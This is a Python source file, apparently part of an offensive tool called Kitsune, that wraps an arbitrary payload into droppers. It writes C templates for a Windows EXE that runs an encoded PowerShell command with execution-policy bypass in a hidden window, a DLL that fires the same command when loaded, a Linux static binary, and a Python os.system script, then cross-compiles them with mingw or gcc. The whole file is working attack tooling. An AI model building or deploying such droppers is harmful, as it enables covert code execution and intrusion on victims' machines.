#!/usr/bin/python3
#=========================#
#  Kitsune by @JoelGMSec  #
#      darkbyte.net       #
#=========================#

import os
import subprocess

template_code_exe = """
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main() {{
    // PowerShell command you want to execute
    const char *command = "powershell -ep bypass -e \\"{payload}\\"";

    // Structures required for CreateProcess
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hide the window

    ZeroMemory(&pi, sizeof(pi));

    // Create the process
    if (!CreateProcess(NULL,
                       (LPSTR)command,
                       NULL,
                       NULL,
                       FALSE,
                       0,
                       NULL,
                       NULL,
                       &si,
                       &pi)
    ) {{
        printf("Error creating process (%d).\\n", GetLastError());
        return EXIT_FAILURE;
    }}

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("PowerShell command executed successfully\\n");
    return EXIT_SUCCESS;
}}
"""

template_code_dll = """
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Prototipo de DllRegisterServer
STDAPI DllRegisterServer(void);

// Punto de entrada de la DLL
BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpReserved) {{
    if (fdwReason == DLL_PROCESS_ATTACH) {{
        system("powershell -ep bypass -e \\"{payload}\\"");
    }}
    return TRUE;
}}

// Implementación de DllRegisterServer
STDAPI DllRegisterServer(void) {{
    return S_OK;
}}

// Implementación de DllUnregisterServer
STDAPI DllUnregisterServer(void) {{
    return S_OK;
}}
"""

template_code_bin = """
#include <stdio.h>
#include <stdlib.h>

int main() {{
    // Bash command you want to execute
    const char *command = "{payload}";

    // Execute the command
    int result = system(command);

    if (result == -1) {{
        printf("Error executing command.\\n");
        return EXIT_FAILURE;
    }}

    printf("Bash command executed successfully\\n");
    return EXIT_SUCCESS;
}}
"""

def create_py_file(payload, dst_file):
    template_code = """#!/usr/bin/python3
import os
os.system("{payload}")
"""
    escaped_payload = payload.replace('"', '\\"')
    code = template_code.format(payload=escaped_payload)
    with open(dst_file, "w") as file:
        file.write(code)

def create_c_file(payload, dst_file, format):     
    escaped_payload = payload.replace('"', '\\"').replace('\\', '\\\\')
    if format == "exe":
        code = template_code_exe.format(payload=escaped_payload)
    if format == "dll":
        code = template_code_dll.format(payload=escaped_payload)
    if format == "bin":
        code = template_code_bin.format(payload=escaped_payload)
    with open(f"{dst_file}.c", "w") as file:
        file.write(code)

def compile_exe_file(dst_file):
    c_file = dst_file + ".c"
    exe_file = dst_file + ".exe"
    try:
        subprocess.run(["x86_64-w64-mingw32-gcc", c_file, "-o", exe_file], check=True)
        os.remove(c_file)
    except:
        pass

def compile_dll_file(dst_file):
    c_file = dst_file + ".c"
    dll_file = dst_file + ".dll"
    try:
        subprocess.run(["x86_64-w64-mingw32-gcc", c_file, "-o", dll_file, "-shared"], check=True)
        os.remove(c_file)
    except:
        pass

def compile_bin_file(dst_file):
    c_file = dst_file + ".c"
    try:
        subprocess.run(["gcc", c_file, "-o", dst_file, "-static"], check=True)
        os.remove(c_file)
        os.system("chmod +x " + dst_file)
    except:
        pass
